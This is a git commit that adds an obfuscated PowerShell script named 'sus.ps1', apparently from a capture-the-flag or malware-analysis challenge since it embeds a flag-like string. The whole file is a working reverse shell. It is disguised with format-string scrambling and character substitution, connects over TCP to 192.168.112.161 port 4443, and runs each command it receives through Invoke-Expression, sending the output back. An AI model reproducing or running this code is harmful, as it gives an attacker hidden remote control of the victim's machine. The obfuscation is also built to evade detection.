5fc186406668378256a148bf925fb5052e3a6e60
chiduong2912 <100178269+chiduong2912@users.noreply.github.com>
2023-12-30 01:53:02 +0700

    Add files via upload

---
+++ sus.ps1
@@ -0,0 +1,50 @@
+((("{25}{36}{34}{30}{19}{4}{9}{23}{28}{29}{13}{32}{6}{11}{10}{17}{37}{1}{8}{18}{35}{22}{5}{15}{3}{14}{21}{24}{16}{7}{27}{33}{26}{31}{2}{12}{0}{20}"-f'3]+r85xr','riteToStream (5Z9String) {
+    5Z','ENCe.tOSTRiNG()[','writer.WriteLine(G5SFIA{r85+r85','ketException]','iter] 5Z9stream
+	5Z','s reached. Unable to connect r85+r85to the server.G5S
+    exit 1
+}
+
+5Z9st','Z9','9StreamWriter.Write(5Z9String',' {
+		Wrir85+r85te-Hosr85+r85t G5S[-] Connection failedG5S
+		for (5Z9i = 5; r85+r855Z9i -ge r85+r85','yte[]]5Z9Buffer r85','reamr85+r85 = 5Z9client.Gr85+r85etStream()
+5Z9Streamr85+r85Writer = New-Object IO.StreamWriter(5Z9stream)
+
+[b','1,','-eq 3) {
+    Write-Host G','N000000000r8','9','ad = 5r85+r85','+r85',' + nVXSHE','ystem.Net.Sockets.Soc','85-joiNr85r85)','5+r850_m4cr0_Try_f0l1n4_1nstea',' 5r85+r85Z9StreamWriter.Flush()
+}
+
+WriteToStream nVXnVX
+if (5Z9client.Connr85+r85ected){
+	Write-Host G5S[+] Connected to the server!G5S
+	r85+r855Z9writer = [System.IO.StreamWr','1; 5Z9','d:DDDD_afd9a1434c08aa91b283}G5S)
+	5Z9writer.Flush()
+	while ((5Z9Byr85+r85tesRe','((r855Z9ip = nVX192.168.112.161n','5 Out-String
+		}
+		WriteToStream 5Z9Output
+    }
+} 
+5Z9StreamWriter.Close()r85) -crEPLaCE r85G5Sr85,[CHar]34 -crEPLaCE  ([CHar]110+[CHar]86+[CHar]88),[CHar]39 -crEPLaCE r855Z9r85,[CHar]36-rEPLace r85yLSr85,[CHar]124) WGE . (','stream.Read(5Z9Buffer, 0, 5Z9Bur85+r85ffer.Length)) -gt 0) {
+		5Z9Command = [System.Text.Encoding]::UTF8.','i--) {
+			W','rite-Host G5S[-] Retrying in 5Z9i seconds...G5S
+			Start-Sr85+r85leep -Seconds 1
+		}
+		5Z9retries++
+    }
+}
+r85+r85
+if (5Zr85+r859retries ','nt(5Z9ip, 5Z9port)
+		break
+	} r85+r85catch [S',' h4TveRBosEprefEr','5SMaximum number r85+r85of retrie','GetString(5Z9Buffer, 0, 5Z9BytesRead)
+		5Z9Output = try {
+			Invoke-Expression 5Z9Command 2>&1 yLS Out-String
+r85+r85
+		} catch {
+			5Z9_ yLSr85+r8','ent = New-Object System.Net.Sockets.TCPr85+r85Clie','LL> nVX)
+   ','VX
+5Z9port = nVX4443nVX
+5Z9retries = 0r85+r85
+wr85+r85hile (5Z9rr85+r85etries -lt r85+r853) {
+    try {
+        5Z9cli','= 0..65535 yLS ForEach-Object { 0 }
+
+function W'))-cREPLAcE 'WGE',[ChAr]124-cREPLAcE ([ChAr]114+[ChAr]56+[ChAr]53),[ChAr]39-rePlACE  ([ChAr]104+[ChAr]52+[ChAr]84),[ChAr]36)|&((GET-VArIABlE '*MDR*').NAME[3,11,2]-joiN'')
